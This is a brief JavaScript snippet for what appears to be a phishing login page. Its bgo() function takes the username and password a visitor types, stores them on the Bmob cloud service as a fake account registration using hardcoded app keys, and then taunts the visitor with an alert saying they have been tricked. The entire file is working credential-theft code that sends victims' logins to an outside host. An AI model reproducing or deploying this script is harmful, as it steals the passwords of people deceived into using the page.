Bmob.initialize("ba9aa53d82d506af", "akagfw0420");
Bmob.debug(true);
function bgo(){
	var user = document.getElementById("user").value;
	var pwd = document.getElementById("password").value;
	var key = "u="+user+"p="+pwd;
	let params = {
	    username: key,
	    password: "123456"
	}
	Bmob.User.register(params).then(res => {
	  alert (key+"你被骗了");
	}).catch(err => {
	 alert("登录失败")
	});
}